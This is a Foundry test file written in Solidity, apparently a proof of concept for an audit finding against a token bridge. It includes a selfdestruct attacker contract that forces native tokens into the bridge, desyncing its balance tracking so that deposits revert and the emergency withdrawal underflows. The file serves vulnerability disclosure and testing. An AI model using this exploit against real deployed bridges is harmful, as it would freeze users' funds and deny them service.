// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import {Test, stdError} from "forge-std/Test.sol";
import "src/Issue7/TestBridge.sol";
import "src/helper/ERC20MockMintable.sol";

//import "forge-std/console.sol";

contract IssueSevenTest is Test {
    ERC20MockMintable testERC20;
    TestBridge testToETHBridge;

    address alice = address(0xab);
    address bob = address(0xcd);
    address eve = address(0xbad);

    TheSelfDestruct public selfDestructContract;

    function setUp() public {
        testERC20 = new ERC20MockMintable("TestChain", "TEST");

        vm.chainId(6969); // Test Chain
        testToETHBridge = new TestBridge(6969, 1, address(testERC20));

        // Deal the $TEST tokens to the users
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
        vm.deal(eve, 10 ether);

        vm.prank(eve);
        selfDestructContract = new TheSelfDestruct{value: 2 ether}();
    }

    function testDoSdepositNativeToken() public {
        vm.chainId(1089); // Test Chain

        vm.prank(alice); //Honest UserOne deposits 1 ether to the bridge
        testToETHBridge.depositNativeToken{value: 1 ether}(makeAddr("receiverOne"));

        vm.prank(eve); // malicious user calls the selfDestruct on bridgeHumansEthereum to send the native HEART tokens forcefully, This transfer of tokens in not tracked via "nativeTokenBalance"
        selfDestructContract.callSelfDestruct(payable(address(testToETHBridge)));

        vm.prank(alice); //Honest UserOne deposits 1 ether to the bridge but tx fails casing DoS
        bytes4 selector = bytes4(keccak256("InvalidTransfer()"));
        vm.expectRevert(selector);
        testToETHBridge.depositNativeToken{value: 1 ether}(makeAddr("receiverTwo"));
    }

    function testDosemergencyWithdrawNative() public {
        vm.chainId(1089); // Test Chain

        vm.prank(alice); //Honest UserOne deposits 1 ether to the bridge
        testToETHBridge.depositNativeToken{value: 1 ether}(makeAddr("receiverOne"));

        vm.prank(bob); //Honest UserOne deposits 1 ether to the bridge
        testToETHBridge.depositNativeToken{value: 1 ether}(makeAddr("receiverOne"));

        vm.prank(eve); //malicious user calls the selfDestruct on bridgeHumansEthereum to send the native HEART tokens forcefully, This transfer of tokens in not tracked via "nativeTokenBalance"
        selfDestructContract.callSelfDestruct(payable(address(testToETHBridge)));

        //Admin decides to call the "emergencyWithdrawNative" due to some emergency butt tx fails
        //vm.expectRevert("Reason: Arithmetic over/underflow");
        vm.expectRevert(stdError.arithmeticError);
        testToETHBridge.emergencyWithdrawNative();
    }

    receive() external payable {}
}

contract TheSelfDestruct {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function callSelfDestruct(address payable target) public {
        require(msg.sender == owner, "Not authorized");
        selfdestruct(target); //this will forcefully send native tokens($TEST) to the "target" address
    }
}
